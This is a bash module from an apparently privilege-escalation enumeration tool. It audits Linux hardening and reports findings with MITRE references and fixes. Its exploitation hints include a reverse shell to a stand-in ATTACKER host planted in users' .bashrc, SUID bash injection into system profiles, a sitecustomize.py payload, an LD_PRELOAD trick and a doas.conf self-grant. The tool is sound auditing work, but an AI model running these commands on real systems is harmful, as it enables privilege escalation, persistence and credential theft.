#!/usr/bin/env bash
# modules/security/security_enum.sh - Security hardening, PATH hijacking, MAC, shell profile checks

run_security_enum() {
    [[ "${QUIET_MODE:-0}" == "0" ]] && print_section "SECURITY HARDENING ANALYSIS"

    local start_ms
    start_ms=$(timestamp_ms)

    _check_mac_framework
    _check_writable_shell_profiles
    _check_path_hijacking
    _check_doas_config
    _check_docker_credentials
    _check_writable_python_packages
    _check_writable_path_dirs
    _check_tmp_suid_execution
    _check_process_snooping

    log_timing "security_enum" "$(elapsed_since "$start_ms")"
}

# ──────────────────────────────────────────────────────────────
# MAC Framework (AppArmor / SELinux / Tomoyo)
# ──────────────────────────────────────────────────────────────
_check_mac_framework() {
    print_subsection "Mandatory Access Control (MAC)"

    local mac_found=0

    # SELinux
    if cmd_exists getenforce; then
        local se_status
        se_status=$(getenforce 2>/dev/null)
        echo -e "  ${BOLD_WHITE}SELinux:${RESET} ${se_status}"
        if [[ "$se_status" == "Disabled" ]] || [[ "$se_status" == "Permissive" ]]; then
            add_finding "MEDIUM" "security" "-" "SELinux is ${se_status}" \
                "SELinux is not enforcing - reduced containment of exploits" \
                "sestatus; setenforce 1 (to enable)" \
                "getenforce_output=${se_status} config_hint=$(grep -E '^SELINUX=' /etc/selinux/config 2>/dev/null | head -1)" \
                "Set SELINUX=enforcing in /etc/selinux/config, reboot or setenforce 1, fix denials with audit2allow only after review; keep policies updated." \
                "https://attack.mitre.org/techniques/T1562/001/" \
                "T1562.001"
        fi
        mac_found=1
    elif [[ -d /etc/selinux ]]; then
        local selinux_mode
        selinux_mode=$(grep "^SELINUX=" /etc/selinux/config 2>/dev/null | cut -d= -f2)
        if [[ "$selinux_mode" == "disabled" ]] || [[ "$selinux_mode" == "permissive" ]]; then
            add_finding "MEDIUM" "security" "-" "SELinux configured as ${selinux_mode}" \
                "SELinux is not set to enforcing mode" "" \
                "file=/etc/selinux/config SELINUX=${selinux_mode} perms=$(file_perms /etc/selinux/config 2>/dev/null) owner=$(file_owner /etc/selinux/config 2>/dev/null)" \
                "Set SELINUX=enforcing, install/configure targeted policy, resolve AVC denials, and validate with sesearch before production." \
                "https://attack.mitre.org/techniques/T1562/001/" \
                "T1562.001"
        fi
        mac_found=1
    fi

    # AppArmor
    if cmd_exists aa-status || [[ -d /etc/apparmor.d ]]; then
        local aa_status
        aa_status=$(aa-status 2>/dev/null | head -5)
        if [[ -n "$aa_status" ]]; then
            echo -e "  ${BOLD_WHITE}AppArmor:${RESET} active"
            local complain_count
            complain_count=$(aa-status 2>/dev/null | grep "complain" | grep -oE '[0-9]+' | head -1)
            if [[ "${complain_count:-0}" -gt 0 ]]; then
                print_warn "AppArmor: ${complain_count} profiles in complain mode"
                add_finding "LOW" "security" "-" "AppArmor profiles in complain mode" \
                    "${complain_count} AppArmor profiles are in complain mode (not enforcing)" "" \
                    "complain_profile_count=${complain_count} aa_status_head=$(aa-status 2>/dev/null | head -3 | tr '\n' '; ')" \
                    "Switch profiles to enforce mode after log review; use aa-enforce; automate regression tests before enforcing on critical services." \
                    "https://attack.mitre.org/techniques/T1562/001/" \
                    "T1562.001"
            fi

            local unconfined
            unconfined=$(aa-status 2>/dev/null | grep "unconfined" | grep -oE '[0-9]+' | head -1)
            if [[ "${unconfined:-0}" -gt 5 ]]; then
                print_warn "AppArmor: ${unconfined} unconfined processes"
                add_finding "INFO" "security" "-" "AppArmor: ${unconfined} unconfined processes" \
                    "Many processes running without AppArmor confinement" "" \
                    "unconfined_count=${unconfined} aa_status_sample=$(aa-status 2>/dev/null | grep -i unconfined | head -1)" \
                    "Add or refine profiles for high-value processes; reduce unconfined binaries; integrate profile generation into CI/CD image builds." \
                    "https://attack.mitre.org/techniques/T1562/001/" \
                    "T1562.001"
            fi
        else
            add_finding "MEDIUM" "security" "-" "AppArmor installed but not active" \
                "AppArmor is installed but not running" "" \
                "apparmor_config_dir=/etc/apparmor.d systemd_unit_check=$(systemctl is-active apparmor 2>/dev/null || echo n/a)" \
                "Enable and start AppArmor (systemctl enable --now apparmor); load profiles; verify with aa-status." \
                "https://attack.mitre.org/techniques/T1562/001/" \
                "T1562.001"
        fi
        mac_found=1
    fi

    # Tomoyo
    if [[ -f /sys/kernel/security/tomoyo/version ]]; then
        echo -e "  ${BOLD_WHITE}Tomoyo:${RESET} active"
        mac_found=1
    fi

    if [[ $mac_found -eq 0 ]]; then
        add_finding "MEDIUM" "security" "-" "No MAC framework detected" \
            "No AppArmor, SELinux, or Tomoyo detected - reduced exploit containment" \
            "" \
            "kernel=$(uname -r 2>/dev/null) checks=getenforce_missing aa_dir_present=$([[ -d /etc/apparmor.d ]] && echo yes || echo no)" \
            "Deploy SELinux or AppArmor with enforcing profiles appropriate to the workload; combine with seccomp and least-privilege containers." \
            "https://attack.mitre.org/techniques/T1562/001/" \
            "T1562.001"
    fi
}

# ──────────────────────────────────────────────────────────────
# Writable shell profile files (persistence / privilege escalation)
# ──────────────────────────────────────────────────────────────
_check_writable_shell_profiles() {
    print_subsection "Shell Profile Security"

    local system_profiles=(
        "/etc/profile"
        "/etc/profile.d/"
        "/etc/bash.bashrc"
        "/etc/bashrc"
        "/etc/zsh/zshrc"
        "/etc/zsh/zprofile"
        "/etc/environment"
    )

    for prof in "${system_profiles[@]}"; do
        if [[ -f "$prof" ]] && is_writable "$prof"; then
            add_finding "CRITICAL" "security" "-" "Writable system shell profile: ${prof}" \
                "System shell profile ${prof} is writable - can inject commands executed by all users" \
                "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> ${prof}" \
                "file=${prof} perms=$(file_perms "$prof" 2>/dev/null) owner=$(file_owner "$prof" 2>/dev/null)" \
                "chown root:root, chmod 644 or tighter per distribution; use immutable flag after validation; audit for unauthorized writes." \
                "https://attack.mitre.org/techniques/T1546/004/" \
                "T1546.004"
        elif [[ -d "$prof" ]]; then
            while IFS= read -r pfile; do
                if is_writable "$pfile"; then
                    add_finding "HIGH" "security" "-" "Writable profile.d script: ${pfile}" \
                        "Profile script ${pfile} is writable - commands injected run at every login" \
                        "echo 'chmod +s /bin/bash' >> ${pfile}" \
                        "file=${pfile} perms=$(file_perms "$pfile" 2>/dev/null) owner=$(file_owner "$pfile" 2>/dev/null) directory=${prof}" \
                        "Restore root ownership and 644/755 as appropriate; remove untrusted snippets; deploy FIM on /etc/profile.d." \
                        "https://attack.mitre.org/techniques/T1546/004/" \
                        "T1546.004"
                fi
            done < <(find "$prof" -type f 2>/dev/null)
        fi
    done

    # Other users' .bashrc (if readable/writable)
    while IFS=: read -r user _ uid _ _ home _; do
        [[ "$uid" -lt 1000 && "$user" != "root" ]] && continue
        [[ "$user" == "$SYSTEM_USER" ]] && continue
        [[ -d "$home" ]] || continue

        for rc_file in ".bashrc" ".bash_profile" ".profile" ".zshrc"; do
            local target="${home}/${rc_file}"
            if [[ -f "$target" ]] && is_writable "$target"; then
                add_finding "HIGH" "security" "-" "Writable ${rc_file} for user ${user}" \
                    "${target} is writable - inject commands for user ${user}" \
                    "echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> ${target}" \
                    "file=${target} perms=$(file_perms "$target" 2>/dev/null) owner=$(file_owner "$target" 2>/dev/null) user=${user} uid=${uid}" \
                    "Correct ownership to ${user} and remove group/other write; use umask 077 for dotfiles; monitor homedir permissions." \
                    "https://attack.mitre.org/techniques/T1546/004/" \
                    "T1546.004"
            fi
        done
    done < /etc/passwd 2>/dev/null
}

# ──────────────────────────────────────────────────────────────
# PATH hijacking (user PATH has writable dirs before system dirs)
# ──────────────────────────────────────────────────────────────
_check_path_hijacking() {
    print_subsection "PATH Hijacking"

    IFS=: read -ra path_entries <<< "${PATH:-}"
    local system_seen=0

    for dir in "${path_entries[@]}"; do
        [[ -z "$dir" ]] && continue
        [[ "$dir" == "." ]] && {
            add_finding "HIGH" "security" "-" "Current directory (.) in PATH" \
                "PATH contains '.' - running any program first checks CWD" \
                "Create malicious binary with same name as common command in CWD" \
                "PATH_snapshot=${PATH}" \
                "Remove . from PATH in shell profiles and systemd units; use absolute paths in scripts; educate users not to export insecure PATH." \
                "https://attack.mitre.org/techniques/T1574/007/" \
                "T1574.007"
            continue
        }

        case "$dir" in
            /usr/bin|/usr/sbin|/bin|/sbin|/usr/local/bin|/usr/local/sbin)
                system_seen=1
                ;;
            *)
                if [[ -d "$dir" ]] && is_writable "$dir"; then
                    local sev="MEDIUM"
                    [[ $system_seen -eq 0 ]] && sev="HIGH"
                    add_finding "$sev" "security" "-" "Writable directory in PATH: ${dir}" \
                        "PATH contains writable ${dir}$([ $system_seen -eq 0 ] && echo ' (before system directories)')" \
                        "Place malicious binary in ${dir}" \
                        "path_entry=${dir} perms=$(file_perms "$dir" 2>/dev/null) owner=$(file_owner "$dir" 2>/dev/null) before_system_dirs=$([[ $system_seen -eq 0 ]] && echo yes || echo no) PATH=${PATH}" \
                        "Remove writable dirs from PATH or fix permissions to root:root 755; reorder PATH so trusted system dirs precede user locations." \
                        "https://attack.mitre.org/techniques/T1574/007/" \
                        "T1574.007"
                fi
                ;;
        esac
    done
}

# ──────────────────────────────────────────────────────────────
# doas support (OpenBSD-style sudo alternative)
# ──────────────────────────────────────────────────────────────
_check_doas_config() {
    cmd_exists doas || [[ -f /etc/doas.conf ]] || return

    print_subsection "doas Configuration"

    if [[ -r /etc/doas.conf ]]; then
        echo -e "  ${CYAN}[INFO]${RESET} doas.conf found:"

        while IFS= read -r line; do
            [[ "$line" =~ ^# ]] && continue
            [[ -z "${line// /}" ]] && continue

            echo -e "  ${GREY}${line}${RESET}"

            if echo "$line" | grep -qi "nopass"; then
                local doas_user
                doas_user=$(echo "$line" | grep -oE 'permit\s+nopass\s+\S+' | awk '{print $3}')
                if [[ "$doas_user" == "$SYSTEM_USER" || "$doas_user" == ":" || -z "$doas_user" ]]; then
                    add_finding "HIGH" "security" "-" "doas nopass entry for current user" \
                        "doas allows passwordless privilege escalation" \
                        "doas /bin/sh" \
                        "doas.conf_line=$(echo "$line" | head -c 200) permit_user=${doas_user:-any} file_perms=$(file_perms /etc/doas.conf 2>/dev/null) file_owner=$(file_owner /etc/doas.conf 2>/dev/null)" \
                        "Require authentication for privileged commands; scope permit rules to explicit binaries; keep /etc/doas.conf root-owned 600." \
                        "https://attack.mitre.org/techniques/T1548/003/" \
                        "T1548.003"
                fi
            fi

            if echo "$line" | grep -qi "permit.*keepenv"; then
                add_finding "MEDIUM" "security" "-" "doas keepenv configured" \
                    "doas preserves environment - potential LD_PRELOAD injection" \
                    "doas env LD_PRELOAD=/tmp/evil.so /some/command" \
                    "doas.conf_line=$(echo "$line" | head -c 200)" \
                    "Remove keepenv where possible; use explicit environment allowlists; harden dynamic linker paths and strip dangerous variables before privilege boundary." \
                    "https://attack.mitre.org/techniques/T1548/003/" \
                    "T1548.003"
            fi
        done < /etc/doas.conf
    fi

    if is_writable /etc/doas.conf; then
        add_finding "CRITICAL" "security" "-" "Writable /etc/doas.conf" \
            "doas configuration file is writable - can grant self root access" \
            "echo 'permit nopass $(id -un) as root' >> /etc/doas.conf && doas sh" \
            "file=/etc/doas.conf perms=$(file_perms /etc/doas.conf 2>/dev/null) owner=$(file_owner /etc/doas.conf 2>/dev/null)" \
            "chown root:wheel or root:root, chmod 600; deploy configuration management and FIM on /etc/doas.conf." \
            "https://attack.mitre.org/techniques/T1548/003/" \
            "T1548.003"
    fi
}

# ──────────────────────────────────────────────────────────────
# Docker credential files
# ──────────────────────────────────────────────────────────────
_check_docker_credentials() {
    print_subsection "Docker/Container Credentials"

    local docker_configs=(
        "${HOME}/.docker/config.json"
        "/root/.docker/config.json"
        "${HOME}/.dockercfg"
    )

    for dconf in "${docker_configs[@]}"; do
        if [[ -r "$dconf" ]]; then
            if grep -qi "auth" "$dconf" 2>/dev/null; then
                add_finding "HIGH" "credentials" "-" "Docker registry credentials: ${dconf}" \
                    "Docker config contains registry authentication tokens" \
                    "cat ${dconf} | base64 -d (auth field) to reveal credentials" \
                    "file=${dconf} perms=$(file_perms "$dconf" 2>/dev/null) owner=$(file_owner "$dconf" 2>/dev/null) has_auth_key=yes" \
                    "Use credential helpers and OS keyrings; chmod 600 on config.json; rotate registry passwords; prefer short-lived tokens and SSO." \
                    "https://attack.mitre.org/techniques/T1552/001/" \
                    "T1552.001"
            fi
        fi
    done

    # Podman credential store
    if [[ -r "${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/containers/auth.json" ]]; then
        local _pod_auth="${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/containers/auth.json"
        add_finding "HIGH" "credentials" "-" "Podman/container registry credentials found" \
            "Container registry auth tokens accessible" \
            "cat ${_pod_auth}" \
            "file=${_pod_auth} perms=$(file_perms "$_pod_auth" 2>/dev/null) owner=$(file_owner "$_pod_auth" 2>/dev/null)" \
            "Restrict runtime dir permissions; use credential helpers; clear unused auth.json entries; rotate registry credentials." \
            "https://attack.mitre.org/techniques/T1552/001/" \
            "T1552.001"
    fi
}

# ──────────────────────────────────────────────────────────────
# Writable Python/pip/npm package paths
# ──────────────────────────────────────────────────────────────
_check_writable_python_packages() {
    print_subsection "Package Manager Security"

    # Python site-packages
    for py_cmd in python3 python; do
        cmd_exists "$py_cmd" || continue
        local site_packages
        site_packages=$("$py_cmd" -c "import site; print('\n'.join(site.getsitepackages()))" 2>/dev/null)

        while IFS= read -r sp_dir; do
            [[ -z "$sp_dir" ]] && continue
            if [[ -d "$sp_dir" ]] && is_writable "$sp_dir"; then
                add_finding "HIGH" "security" "-" "Writable Python site-packages: ${sp_dir}" \
                    "Python package directory is writable - module injection possible" \
                    "echo 'import os; os.system(\"chmod +s /bin/bash\")' > ${sp_dir}/sitecustomize.py" \
                    "site_packages=${sp_dir} perms=$(file_perms "$sp_dir" 2>/dev/null) owner=$(file_owner "$sp_dir" 2>/dev/null) interpreter=${py_cmd}" \
                    "Restore root ownership on system site-packages; use virtualenvs for user code; enable integrity tooling on Python paths." \
                    "https://attack.mitre.org/techniques/T1574/006/" \
                    "T1574.006"
            fi
        done <<< "$site_packages"
        break
    done

    # Node.js global modules
    if cmd_exists npm; then
        local npm_global
        npm_global=$(npm root -g 2>/dev/null)
        if [[ -n "$npm_global" ]] && [[ -d "$npm_global" ]] && is_writable "$npm_global"; then
            add_finding "HIGH" "security" "-" "Writable npm global modules: ${npm_global}" \
                "npm global module directory is writable" \
                "Install malicious npm package globally" \
                "npm_global_root=${npm_global} perms=$(file_perms "$npm_global" 2>/dev/null) owner=$(file_owner "$npm_global" 2>/dev/null)" \
                "Fix ownership to root; use npm prefix per-user installs; enable package lock and supply-chain scanning; avoid global npm install on shared hosts." \
                "https://attack.mitre.org/techniques/T1574/006/" \
                "T1574.006"
        fi
    fi

    # Ruby gems
    if cmd_exists gem; then
        local gem_dir
        gem_dir=$(gem environment gemdir 2>/dev/null)
        if [[ -n "$gem_dir" ]] && [[ -d "$gem_dir" ]] && is_writable "$gem_dir"; then
            add_finding "MEDIUM" "security" "-" "Writable Ruby gem directory: ${gem_dir}" \
                "Ruby gem directory is writable" "" \
                "gemdir=${gem_dir} perms=$(file_perms "$gem_dir" 2>/dev/null) owner=$(file_owner "$gem_dir" 2>/dev/null)" \
                "Use rbenv/rvm user installs or root-owned system gems; audit gem install paths; restrict write with filesystem permissions." \
                "https://attack.mitre.org/techniques/T1574/006/" \
                "T1574.006"
        fi
    fi
}

# ──────────────────────────────────────────────────────────────
# Writable directories in system PATH
# ──────────────────────────────────────────────────────────────
_check_writable_path_dirs() {
    print_subsection "System PATH Directories"

    local system_paths=("/usr/local/sbin" "/usr/local/bin" "/usr/sbin" "/usr/bin" "/sbin" "/bin")

    for spath in "${system_paths[@]}"; do
        if [[ -d "$spath" ]] && is_writable "$spath"; then
            add_finding "CRITICAL" "security" "-" "Writable system PATH directory: ${spath}" \
                "System binary directory ${spath} is writable - can plant trojan binaries" \
                "cp /bin/sh ${spath}/ls  (any command hijacking)" \
                "dir=${spath} perms=$(file_perms "$spath" 2>/dev/null) owner=$(file_owner "$spath" 2>/dev/null)" \
                "Restore root:root and 755; reinstall affected packages; deploy AIDE/rpm -V monitoring; investigate unauthorized writes." \
                "https://attack.mitre.org/techniques/T1574/007/" \
                "T1574.007"
        fi
    done
}

# ──────────────────────────────────────────────────────────────
# /tmp SUID execution check
# ──────────────────────────────────────────────────────────────
_check_tmp_suid_execution() {
    local tmp_mount_opts
    tmp_mount_opts=$(mount 2>/dev/null | grep " /tmp " | head -1)

    if [[ -n "$tmp_mount_opts" ]]; then
        if ! echo "$tmp_mount_opts" | grep -q "nosuid"; then
            add_finding "INFO" "security" "-" "/tmp mounted without nosuid" \
                "/tmp does not have nosuid - SUID binaries can be placed here" "" \
                "mount_line=$(echo "$tmp_mount_opts" | head -c 240)" \
                "Add nosuid (and nodev) to /tmp in fstab/systemd mount units; remount; combine with noexec where compatible with workloads." \
                "https://attack.mitre.org/techniques/T1562/001/" \
                "T1562.001"
        fi
        if ! echo "$tmp_mount_opts" | grep -q "noexec"; then
            add_finding "INFO" "security" "-" "/tmp mounted without noexec" \
                "/tmp does not have noexec - compiled exploits can run from /tmp" "" \
                "mount_line=$(echo "$tmp_mount_opts" | head -c 240)" \
                "Add noexec to /tmp mounts for general-purpose servers; use alternate writable areas for legitimate executables if needed." \
                "https://attack.mitre.org/techniques/T1562/001/" \
                "T1562.001"
        fi
    fi
}

# ──────────────────────────────────────────────────────────────
# Process snooping - hidden cron detection via /proc
# ──────────────────────────────────────────────────────────────
_check_process_snooping() {
    [[ "${VERBOSE_MODE:-0}" == "1" ]] || return

    print_subsection "Process Snooping (Quick)"

    local snapshot1 snapshot2
    snapshot1=$(ps -eo user,pid,args 2>/dev/null | sort)
    sleep 2
    snapshot2=$(ps -eo user,pid,args 2>/dev/null | sort)

    local new_procs
    new_procs=$(comm -13 <(echo "$snapshot1") <(echo "$snapshot2") 2>/dev/null | grep "^root" | head -5)

    if [[ -n "$new_procs" ]]; then
        echo -e "  ${CYAN}[INFO]${RESET} New root processes detected (possible hidden cron):"
        echo "$new_procs" | while IFS= read -r line; do
            echo -e "  ${GREY}${line}${RESET}"
        done
        add_finding "INFO" "security" "-" "Transient root processes detected" \
            "Processes started by root during scan window - may indicate cron jobs" \
            "Run pspy or monitor /proc for hidden scheduled tasks" \
            "sample_new_root_procs=$(echo "$new_procs" | tr '\n' '; ' | head -c 400) window_seconds=2" \
            "Correlate with auditd, systemd timers, and cron logs; use long-running process monitors in incident response." \
            "https://attack.mitre.org/techniques/T1057/" \
            "T1057"
    fi
}
